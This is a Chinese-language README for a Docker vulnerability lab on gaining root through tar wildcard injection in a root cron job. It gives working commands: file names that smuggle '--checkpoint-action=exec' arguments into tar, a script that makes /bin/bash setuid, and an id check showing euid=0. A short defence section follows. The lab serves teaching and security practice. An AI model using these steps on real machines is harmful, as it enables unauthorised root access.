# Cron 计划任务提权（tar 通配符注入）

## 原理

root 的 cron 执行 `tar czf /tmp/backup.tar.gz *`（在 /tmp/backup 目录里）。
shell 的 `*` 通配符展开后，文件名会成为 tar 的命令行参数。攻击者在目录里创建
名为 `--checkpoint=1` 和 `--checkpoint-action=exec=sh run.sh` 的文件，
tar 会把它们**当作自己的参数**解析——GNU tar 的 --checkpoint-action 可以
在打包过程中执行任意命令（以 root 身份）。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/tmp/backup 权限 777，root cron 在其中执行 tar 通配符

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 构造恶意文件名 (tar 参数注入)
cd /tmp/backup
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh run.sh'

# 4. 写要执行的脚本
echo 'chmod u+s /bin/bash' > run.sh
chmod +x run.sh

# 5. 等待 cron 执行 (最多 65 秒)
sleep 65

# 6. 验证提权
ls -l /bin/bash
# 预期输出: -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p -c 'id'
# 预期输出: euid=0(root)   提权成功!

# 7. 一键利用
bash exploit.sh
```

## 为什么能成功

`touch -- '--checkpoint=1'` 创建了以 `--` 开头的文件（`--` 让 touch 不把它当参数）。
cron 里 `tar czf /tmp/backup.tar.gz *` 展开后变成
`tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh run.sh ...`，
tar 解析出 --checkpoint-action 并以 root 执行 run.sh。

## 防御

- tar 命令使用绝对路径并避免通配符展开（如 `tar czf x.tar.gz /tmp/backup` 不带 *）
- root 任务的工作目录不可被普通用户写

## 验证记录

2026-08-26 真实环境验证：注入后等待 65 秒，`/bin/bash -p -c 'id'` 输出
`uid=1000(lowpriv) ... euid=0(root)`。复现成功。
